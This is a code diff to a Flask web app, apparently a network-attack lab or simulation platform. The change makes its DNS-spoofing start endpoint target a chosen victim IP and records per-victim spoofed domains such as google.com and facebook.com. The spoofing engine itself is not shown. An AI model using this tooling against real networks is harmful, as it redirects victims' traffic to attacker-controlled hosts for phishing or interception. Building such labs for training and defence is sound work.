@@ -248,26 +248,29 @@ def stop_syn_attack():
 @attacks_bp.route('/dns/start', methods=['POST'])
 @require_attacker
 def start_dns_attack():
-    """Start DNS spoofing attack"""
+    """Start DNS spoofing attack targeting specific victim"""
     try:
         data = request.get_json()
+        victim_ip = data.get('victim_ip')
         attacker_ip = data.get('attacker_ip')
         target_domains = data.get('target_domains', ['google.com', 'facebook.com'])
         interface = data.get('interface')
         
         # Validate
+        if not victim_ip:
+            return jsonify({'error': 'Missing parameter: victim_ip'}), 400
         if not attacker_ip:
             return jsonify({'error': 'Missing parameter: attacker_ip'}), 400
         
-        # Create unique attack ID
-        attack_id = f"dns_{attacker_ip}"
+        # Create unique attack ID (victim-specific)
+        attack_id = f"dns_{victim_ip}_{attacker_ip}"
         
         # Check if already running
         if attack_id in active_attacks:
-            return jsonify({'error': 'DNS attack already running'}), 400
+            return jsonify({'error': 'DNS attack on this victim already running'}), 400
         
-        # Create DNS spoofer
-        spoofer = DNSSpoofer(attacker_ip, target_domains, interface)
+        # Create DNS spoofer with victim IP filter
+        spoofer = DNSSpoofer(attacker_ip, target_domains, interface, victim_ip=victim_ip)
         
         # Start attack
         spoofer.start_attack()
@@ -276,19 +279,22 @@ def start_dns_attack():
         active_attacks[attack_id] = {
             'object': spoofer,
             'type': 'DNS',
+            'victim_ip': victim_ip,
             'attacker_ip': attacker_ip,
             'target_domains': target_domains,
+            'target_ip': victim_ip,  # For UI consistency
             'packets_spoofed': 0,
             'status': 'running'
         }
         
         # Log attack
-        log_attack('DNS_SPOOFING', attacker_ip, ','.join(target_domains), 'running')
+        log_attack('DNS_SPOOFING', victim_ip, ','.join(target_domains), 'running')
         
         return jsonify({
             'status': 'started',
             'attack_id': attack_id,
-            'message': f'DNS spoofing attack started (attacker IP: {attacker_ip})',
+            'message': f'DNS spoofing attack started: {victim_ip} → {attacker_ip} for {", ".join(target_domains)}',
+            'victim_ip': victim_ip,
             'target_domains': target_domains
         }), 200
     
